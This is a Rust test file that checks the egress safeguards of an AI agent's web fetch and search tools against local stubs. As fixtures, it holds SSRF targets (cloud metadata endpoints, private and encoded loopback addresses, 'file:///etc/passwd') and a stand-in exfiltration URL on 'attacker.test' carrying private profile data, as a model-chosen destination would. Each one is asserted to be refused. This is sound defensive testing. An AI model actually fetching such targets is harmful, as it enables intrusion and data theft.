//! `web.fetch` and `web.search` against local stub servers through the real
//! HTTP client, with a controlled resolver. Every secret is synthetic, every
//! destination is a local stub or is refused before any connection, and no
//! test reaches a real metadata or private service.

use std::collections::{BTreeMap, HashMap};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use async_trait::async_trait;
use lightagent_core::permissions::ApprovalPolicy;
use lightagent_core::{PolicyEngine, RunId, ToolCall, ToolInvoker};
use lightagent_tools::builtins::web::{fetch_text, search_results};
use lightagent_tools::egress::Resolver;
use lightagent_tools::{BoundedExecutor, ToolRegistry, WebContext, WebPolicy};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio_util::sync::CancellationToken;

const SEARCH_KEY: &str = "synthetic-search-key-not-a-secret";

/// One request a stub received.
#[derive(Clone, Debug)]
struct Seen {
    path: String,
    headers: BTreeMap<String, String>,
}

/// What a stub answers for a path.
#[derive(Clone)]
enum Reply {
    Text(&'static str),
    Redirect(String),
    Big(usize),
    Hang,
}

struct Stub {
    port: u16,
    seen: Arc<Mutex<Vec<Seen>>>,
    connections: Arc<AtomicUsize>,
}

impl Stub {
    fn seen(&self) -> Vec<Seen> {
        self.seen.lock().unwrap().clone()
    }
}

async fn stub(routes: impl Fn(&str) -> Reply + Send + Sync + 'static) -> Stub {
    let listener = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)).await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let connections = Arc::new(AtomicUsize::new(0));
    let routes = Arc::new(routes);
    let (log, count) = (seen.clone(), connections.clone());
    tokio::spawn(async move {
        while let Ok((mut stream, _)) = listener.accept().await {
            count.fetch_add(1, Ordering::SeqCst);
            let (log, routes) = (log.clone(), routes.clone());
            tokio::spawn(async move {
                let mut bytes = Vec::new();
                let mut buf = [0u8; 4096];
                while !bytes.windows(4).any(|w| w == b"\r\n\r\n") {
                    match stream.read(&mut buf).await {
                        Ok(0) | Err(_) => return,
                        Ok(n) => bytes.extend_from_slice(&buf[..n]),
                    }
                }
                let head = String::from_utf8_lossy(&bytes).into_owned();
                let mut lines = head.lines();
                let path = lines
                    .next()
                    .and_then(|line| line.split_whitespace().nth(1))
                    .unwrap_or("/")
                    .to_owned();
                let headers = lines
                    .take_while(|line| !line.is_empty())
                    .filter_map(|line| line.split_once(':'))
                    .map(|(k, v)| (k.trim().to_ascii_lowercase(), v.trim().to_owned()))
                    .collect();
                log.lock().unwrap().push(Seen {
                    path: path.clone(),
                    headers,
                });
                let response = match routes(&path) {
                    Reply::Text(body) => format!(
                        "HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                        body.len()
                    ),
                    Reply::Redirect(location) => format!(
                        "HTTP/1.1 302 Found\r\nlocation: {location}\r\ncontent-length: 0\r\nconnection: close\r\n\r\n"
                    ),
                    Reply::Big(size) => format!(
                        "HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\ncontent-length: {size}\r\nconnection: close\r\n\r\n{}",
                        "x".repeat(size)
                    ),
                    Reply::Hang => {
                        tokio::time::sleep(Duration::from_secs(60)).await;
                        return;
                    }
                };
                let _ = stream.write_all(response.as_bytes()).await;
                let _ = stream.shutdown().await;
            });
        }
    });
    Stub {
        port,
        seen,
        connections,
    }
}

/// A resolver answering from a table, counting lookups.
#[derive(Default)]
struct Table {
    answers: HashMap<String, Vec<IpAddr>>,
    lookups: AtomicUsize,
}

impl Table {
    fn with(entries: &[(&str, IpAddr)]) -> Arc<Self> {
        let mut answers: HashMap<String, Vec<IpAddr>> = HashMap::new();
        for (host, ip) in entries {
            answers.entry((*host).to_owned()).or_default().push(*ip);
        }
        Arc::new(Self {
            answers,
            lookups: AtomicUsize::new(0),
        })
    }
}

#[async_trait]
impl Resolver for Table {
    async fn resolve(&self, host: &str, port: u16) -> std::io::Result<Vec<SocketAddr>> {
        self.lookups.fetch_add(1, Ordering::SeqCst);
        self.answers
            .get(host)
            .map(|ips| ips.iter().map(|ip| SocketAddr::new(*ip, port)).collect())
            .ok_or_else(|| std::io::Error::other("no such host"))
    }
}

fn loopback() -> IpAddr {
    IpAddr::V4(Ipv4Addr::LOCALHOST)
}

fn v4(a: u8, b: u8, c: u8, d: u8) -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(a, b, c, d))
}

fn client() -> reqwest::Client {
    let _ = rustls::crypto::ring::default_provider().install_default();
    reqwest::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/// An operator context whose trusted network is the loopback stub.
fn context(policy: WebPolicy, resolver: Arc<Table>) -> WebContext {
    let mut web = WebContext::new(client(), Arc::new(policy));
    web.resolver = resolver;
    web
}

fn trusted_loopback() -> WebPolicy {
    WebPolicy {
        trusted_networks: vec!["127.0.0.1/32".parse().unwrap()],
        timeout: Duration::from_secs(5),
        ..WebPolicy::default()
    }
}

// 1. Same-origin redirect, followed, with no credential sent at any hop.
#[tokio::test]
async fn a_same_origin_redirect_is_followed_without_credentials() {
    let server = stub(|path| match path {
        "/start" => Reply::Redirect("/final".to_owned()),
        _ => Reply::Text("final page"),
    })
    .await;
    let web = context(
        trusted_loopback(),
        Table::with(&[("site.test", loopback())]),
    );
    let text = fetch_text(&web, &format!("http://site.test:{}/start", server.port))
        .await
        .unwrap();
    assert!(text.contains("final page"));
    let seen = server.seen();
    assert_eq!(seen.len(), 2);
    for request in &seen {
        assert!(!request.headers.contains_key("authorization"));
        assert!(!request.headers.contains_key("cookie"));
        // The name was used for Host (and would be for TLS/SNI) while the
        // connection was pinned to the vetted address.
        assert_eq!(
            request.headers["host"],
            format!("site.test:{}", server.port)
        );
    }
}

// 5. Redirect loops.
#[tokio::test]
async fn a_redirect_loop_is_detected() {
    let server = stub(|path| match path {
        "/a" => Reply::Redirect("/b".to_owned()),
        _ => Reply::Redirect("/a".to_owned()),
    })
    .await;
    let web = context(
        trusted_loopback(),
        Table::with(&[("site.test", loopback())]),
    );
    let error = fetch_text(&web, &format!("http://site.test:{}/a", server.port))
        .await
        .unwrap_err();
    assert!(error.contains("loop"), "{error}");
    assert_eq!(server.seen().len(), 2);
}

// 6. Redirect chains into prohibited destinations are refused before any
//    connection to them.
#[tokio::test]
async fn a_redirect_into_a_prohibited_destination_is_refused() {
    let metadata = v4(169, 254, 169, 254);
    let private = v4(10, 0, 0, 1);
    for (target, expected) in [
        (format!("http://{metadata}/latest/meta-data/"), "management"),
        (format!("http://{private}/admin"), "non-public"),
        ("http://inside.test/".to_owned(), "non-public"),
        ("file:///etc/passwd".to_owned(), "http and https"),
        ("http://user:pw@site.test/".to_owned(), "credentials"),
    ] {
        let location = target.clone();
        let server = stub(move |path| match path {
            "/start" => Reply::Redirect(location.clone()),
            _ => Reply::Text("never"),
        })
        .await;
        let web = context(
            trusted_loopback(),
            Table::with(&[("site.test", loopback()), ("inside.test", private)]),
        );
        let error = fetch_text(&web, &format!("http://site.test:{}/start", server.port))
            .await
            .unwrap_err();
        assert!(error.contains(expected), "{target}: {error}");
        assert_eq!(server.seen().len(), 1, "{target}");
        assert!(
            !error.contains("meta-data") && !error.contains("pw@"),
            "{error}"
        );
    }
}

// 7. An allow-listed hostname resolving to a private address.
#[tokio::test]
async fn an_allow_listed_name_resolving_privately_is_refused() {
    let server = stub(|_| Reply::Text("internal")).await;
    let policy = WebPolicy {
        allow_domains: vec!["internal.test".to_owned()],
        ..WebPolicy::default()
    };
    let web = context(policy, Table::with(&[("wiki.internal.test", loopback())]));
    let error = fetch_text(&web, &format!("http://wiki.internal.test:{}/", server.port))
        .await
        .unwrap_err();
    assert!(error.contains("non-public"), "{error}");
    assert_eq!(server.connections.load(Ordering::SeqCst), 0);
}

// 8. DNS rebinding: the connection uses the vetted answer, and nothing
//    resolves the name a second time.
#[tokio::test]
async fn the_connection_is_pinned_to_the_vetted_answer() {
    let server = stub(|_| Reply::Text("vetted")).await;
    // `rebind.test` exists only in this table: if the client resolved it
    // itself, the request would fail.
    let table = Table::with(&[("rebind.test", loopback())]);
    let web = context(trusted_loopback(), table.clone());
    let text = fetch_text(&web, &format!("http://rebind.test:{}/", server.port))
        .await
        .unwrap();
    assert!(text.contains("vetted"));
    assert_eq!(table.lookups.load(Ordering::SeqCst), 1, "one vetted lookup");
}

// 9–12. Mapped IPv6, loopback, link-local, metadata and host management.
#[tokio::test]
async fn prohibited_destinations_are_never_connected() {
    let server = stub(|_| Reply::Text("reached")).await;
    let port = server.port;
    let table = Table::with(&[
        ("mapped.test", "::ffff:127.0.0.1".parse().unwrap()),
        ("metadata.google.internal", v4(169, 254, 169, 254)),
        ("wireserver.test", v4(168, 63, 129, 16)),
    ]);
    // No trusted network: even the loopback stub is refused.
    let web = context(WebPolicy::default(), table);
    for (target, expected) in [
        (format!("http://mapped.test:{port}/"), "non-public"),
        (format!("http://127.0.0.1:{port}/"), "non-public"),
        (format!("http://[::1]:{port}/"), "non-public"),
        (format!("http://2130706433:{port}/"), "non-public"),
        (format!("http://{}/", v4(169, 254, 1, 1)), "non-public"),
        ("http://metadata.google.internal/".to_owned(), "management"),
        ("http://wireserver.test/".to_owned(), "management"),
    ] {
        let error = fetch_text(&web, &target).await.unwrap_err();
        assert!(error.contains(expected), "{target}: {error}");
    }
    assert_eq!(server.connections.load(Ordering::SeqCst), 0);
}

// 16. A model-chosen destination receiving data from an untrusted run.
#[tokio::test]
async fn an_untrusted_run_cannot_send_data_to_an_unauthorized_host() {
    let server = stub(|_| Reply::Text("collected")).await;
    let policy = WebPolicy {
        untrusted_destinations: Some(vec!["docs.test".to_owned()]),
        ..trusted_loopback()
    };
    let web = context(
        policy,
        Table::with(&[("attacker.test", loopback()), ("docs.test", loopback())]),
    );
    let error = fetch_text(
        &web,
        &format!(
            "http://attacker.test:{}/?profile-notes=synthetic-private",
            server.port
        ),
    )
    .await
    .unwrap_err();
    assert!(error.contains("not authorized for this profile"), "{error}");
    assert!(!error.contains("profile-notes"));
    assert_eq!(server.connections.load(Ordering::SeqCst), 0);
    // Its authorized host still must be public: the trusted network is the
    // operator's, never an untrusted run's.
    let error = fetch_text(&web, &format!("http://docs.test:{}/", server.port))
        .await
        .unwrap_err();
    assert!(error.contains("non-public"), "{error}");
}

// 19. Timeout.
#[tokio::test]
async fn a_hanging_destination_times_out() {
    let server = stub(|_| Reply::Hang).await;
    let policy = WebPolicy {
        timeout: Duration::from_millis(500),
        ..trusted_loopback()
    };
    let web = context(policy, Table::with(&[("slow.test", loopback())]));
    let started = Instant::now();
    let error = fetch_text(&web, &format!("http://slow.test:{}/", server.port))
        .await
        .unwrap_err();
    assert!(started.elapsed() < Duration::from_secs(4), "{error}");
    assert!(
        error.starts_with("could not fetch from slow.test"),
        "{error}"
    );
}

// 20. Oversized responses.
#[tokio::test]
async fn an_oversized_response_is_bounded() {
    let server = stub(|_| Reply::Big(4 * 1024 * 1024)).await;
    let policy = WebPolicy {
        max_fetch_bytes: 1000,
        ..trusted_loopback()
    };
    let web = context(policy, Table::with(&[("big.test", loopback())]));
    let text = fetch_text(&web, &format!("http://big.test:{}/", server.port))
        .await
        .unwrap();
    assert!(text.len() < 2000, "{}", text.len());
}

// 18. Cancellation through the real executor.
#[tokio::test]
async fn cancelling_the_run_stops_a_fetch() {
    let server = stub(|_| Reply::Hang).await;
    let web = context(
        trusted_loopback(),
        Table::with(&[("slow.test", loopback())]),
    );
    let executor = BoundedExecutor::new(
        ToolRegistry::builtin().scoped(&["web.fetch".to_owned()]),
        PolicyEngine::new(ApprovalPolicy::permissive()),
        Duration::from_secs(30),
        262_144,
    )
    .with_run(RunId::new())
    .with_web(web);
    let call = ToolCall {
        id: "call_1".to_owned(),
        name: "web.fetch".to_owned(),
        arguments: format!(r#"{{"url":"http://slow.test:{}/"}}"#, server.port),
    };
    let cancel = CancellationToken::new();
    let trigger = cancel.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(200)).await;
        trigger.cancel();
    });
    let started = Instant::now();
    let outcome = executor.invoke(&call, cancel).await;
    assert!(outcome.is_error);
    assert!(outcome.content.contains("cancelled"), "{}", outcome.content);
    assert!(started.elapsed() < Duration::from_secs(3));
}

// 14, 15. The installation search key and profile grants.
#[tokio::test]
async fn the_search_key_is_used_only_where_granted() {
    let server = stub(|_| Reply::Text(r#"{"results":[]}"#)).await;
    let endpoint = format!("http://127.0.0.1:{}/search", server.port);
    let search = |withheld: bool, untrusted: Option<Vec<String>>| WebPolicy {
        search_endpoint: Some(endpoint.clone()),
        search_api_key: (!withheld).then(|| SEARCH_KEY.to_owned()),
        search_credential_withheld: withheld,
        untrusted_destinations: untrusted,
        ..WebPolicy::default()
    };
    // Not granted: refused, and nothing is sent with or without the key.
    let web = context(
        search(true, Some(vec!["127.0.0.1".to_owned()])),
        Table::with(&[]),
    );
    let error = search_results(&web, "private question", None)
        .await
        .unwrap_err();
    assert!(error.contains("not granted"), "{error}");
    assert_eq!(server.connections.load(Ordering::SeqCst), 0);
    // Granted but the endpoint is not an authorized destination: refused.
    let web = context(
        search(false, Some(vec!["search.test".to_owned()])),
        Table::with(&[]),
    );
    let error = search_results(&web, "q", None).await.unwrap_err();
    assert!(error.contains("not authorized"), "{error}");
    assert_eq!(server.connections.load(Ordering::SeqCst), 0);
    // Granted and authorized: the key reaches the endpoint.
    let web = context(
        search(false, Some(vec!["127.0.0.1".to_owned()])),
        Table::with(&[]),
    );
    search_results(&web, "q", None).await.unwrap();
    let seen = server.seen();
    assert_eq!(seen.len(), 1);
    assert_eq!(
        seen[0].headers["authorization"],
        format!("Bearer {SEARCH_KEY}")
    );
    assert!(seen[0].path.starts_with("/search?q="));
}

// 13. Environment proxies cannot carry a fetch around the pinned address.
//     The probe re-runs this test binary with proxy variables set, pointing
//     at a local listener that counts connections.
#[tokio::test]
async fn environment_proxies_are_never_used_for_a_fetch() {
    let server = stub(|_| Reply::Text("direct")).await;
    let proxy = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)).await.unwrap();
    let proxy_port = proxy.local_addr().unwrap().port();
    let proxied = Arc::new(AtomicUsize::new(0));
    let count = proxied.clone();
    tokio::spawn(async move {
        while let Ok((stream, _)) = proxy.accept().await {
            count.fetch_add(1, Ordering::SeqCst);
            drop(stream);
        }
    });
    let proxy_url = format!("http://127.0.0.1:{proxy_port}");
    let status = tokio::process::Command::new(std::env::current_exe().unwrap())
        .args(["--ignored", "--exact", "proxy_probe", "--nocapture"])
        .env("LIGHTAGENT_PROXY_PROBE_PORT", server.port.to_string())
        .env("HTTP_PROXY", &proxy_url)
        .env("http_proxy", &proxy_url)
        .env("HTTPS_PROXY", &proxy_url)
        .env("ALL_PROXY", &proxy_url)
        .env_remove("NO_PROXY")
        .env_remove("no_proxy")
        .status()
        .await
        .unwrap();
    assert!(status.success(), "the probe failed");
    // The probe's control request (a default client) went through the
    // proxy, which shows the variables were in effect; the fetch did not.
    assert_eq!(proxied.load(Ordering::SeqCst), 1);
    assert_eq!(server.seen().len(), 1, "the fetch went direct");
}

/// Run only by `environment_proxies_are_never_used_for_a_fetch`.
#[tokio::test]
#[ignore = "run by environment_proxies_are_never_used_for_a_fetch in a child process"]
async fn proxy_probe() {
    let port: u16 = std::env::var("LIGHTAGENT_PROXY_PROBE_PORT")
        .expect("run by the parent test")
        .parse()
        .unwrap();
    let web = context(
        trusted_loopback(),
        Table::with(&[("site.test", loopback())]),
    );
    let text = fetch_text(&web, &format!("http://site.test:{port}/"))
        .await
        .unwrap();
    assert!(text.contains("direct"));
    // Control: a client with default settings honors the proxy variables.
    let _ = reqwest::Client::builder()
        .build()
        .unwrap()
        .get(format!("http://example.test:{port}/"))
        .timeout(Duration::from_secs(2))
        .send()
        .await;
}
